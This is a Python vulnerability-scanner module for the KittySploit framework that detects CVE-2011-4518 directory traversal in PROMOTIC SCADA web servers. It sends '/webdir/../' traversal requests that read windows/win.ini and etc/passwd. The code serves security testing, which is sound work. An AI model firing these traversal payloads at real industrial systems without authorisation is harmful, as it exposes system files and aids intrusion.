#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects CVE-2011-4518 via /webdir/."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PROMOTIC SCADA - Directory Traversal Detection (CVE-2011-4518)',
        'description': (
            'Detects CVE-2011-4518 via /webdir/../../../../../../../../windows/win.ini.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2011', 'promotic', 'scada', 'ics', 'lfi', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2011-4518',
        ],
        'cve': 'CVE-2011-4518',
    }

    def run(self):
        path = '/webdir/' + ('../' * 9) + 'windows/win.ini'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        body = (r.text or '') if r else ''
        if '[fonts]' in body.lower() or '[extensions]' in body.lower():
            self.set_info(severity='high', reason='PROMOTIC SCADA directory traversal (CVE-2011-4518)', path='/webdir/')
            return True
        path2 = '/webdir/' + ('../' * 9) + 'etc/passwd'
        r2 = self.http_request(method='GET', path=path2, allow_redirects=False)
        if r2 and re.search(r'root:.*:0:0:', r2.text or ''):
            self.set_info(severity='high', reason='PROMOTIC SCADA directory traversal (CVE-2011-4518)', path='/webdir/')
            return True
        return False

